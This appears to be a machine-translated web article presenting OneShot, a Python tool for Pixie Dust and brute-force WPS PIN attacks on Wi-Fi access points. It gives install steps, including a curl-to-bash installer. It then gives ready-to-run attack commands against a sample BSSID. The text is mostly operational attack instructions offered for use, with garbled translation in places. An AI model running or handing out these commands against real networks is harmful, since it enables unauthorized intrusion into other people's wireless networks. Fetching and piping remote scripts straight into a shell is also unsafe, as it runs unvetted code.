OneShot: WPS Pin attacks without monitoring function!

##
#
https://en.iguru.gr/oneshot-epitheseis-wps-pin-choris-leitourgia-monitoring/
#
https://github.com/nikita-yfh/OneShot-C
#
##

15/04/2022, 13:29

OneShot is an open source python script that executes Pixie Dust attacks without having to first change the interface to monitoring mode.
Contents hide
Specifications
System requirements
Installation
Use
Application snapshots
hack
Specifications

    Pixie Dust attack
    Built-in WPS PIN without 3WiFi connection
    Online WPS bruteforce
    Wi-Fi scanner based on iw

System requirements

    Python 3.6 and above
    Wpa supplicant
    Pixiewps
    iw

Installation

Debian / Ubuntu

sudo apt install -y python3 wpasupplicant iw wget

Pixiewps installation

Ubuntu 18.04 and later or Debian 10 and later

sudo apt install -y pixiewps

Other editions

sudo apt install -y build-essential unzip
wget https://github.com/wiire-a/pixiewps/archive/master.zip && unzip master.zip
cd pixiewps*/
make
sudo make install

Download OneShot

cd ~
wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py

Optional: download a list of vulnerable devices to pixie dust forsignalnote on scan results:

wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt

Arch Linux

Installation requirements

sudo pacman -S wpa_supplicant pixiewps wget python

Download OneShot

wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py

Optional: download a list of vulnerable devices in pixie dust to highlight the scan results:

wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt

Alpine Linux

It can also be used to run on Android devices that use Linux Deploy

Installation requirements
Personcase of the test repository:

sudo sh -c 'echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing/" >> /etc/apk/repositories'

sudo apk add python3 wpa_supplicant pixiewps iw

Download OneShot

sudo wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py

Optional: download a list of vulnerable devices in pixie dust to highlight the scan results:

sudo wget https://raw.githubusercontent.com/drygdryg/OneShot/master/vulnwsc.txt

Termux

Please note that it is required access root.
Use installer

curl -sSf https://raw.githubusercontent.com/drygdryg/OneShot_Termux_installer/master/installer.sh | bash

Manually

Installation requirements

pkg install -y root-repo

pkg install -y git tsu python wpa-supplicant pixiewps iw

Download OneShot

git clone --depth 1 https://github.com/drygdryg/OneShot OneShot

Implementation

sudo python OneShot/oneshot.py -i wlan0 --iface-down -K

Use

Start it attack Pixie Dust on a specified BSSID:

sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K

Show available networks and perform a Pixie Dust attack on a specified one network:

sudo python3 oneshot.py -i wlan0 -K

 WPS bruteforce attack with the specified first half of the PIN:

sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234

WPS connection mode:

sudo python3 oneshot.py -i wlan0 --pbc
Application snapshots
68747470733a2f2f692e696d6775722e636f6d2f324e327a615a742e706e67

Download the program from here.
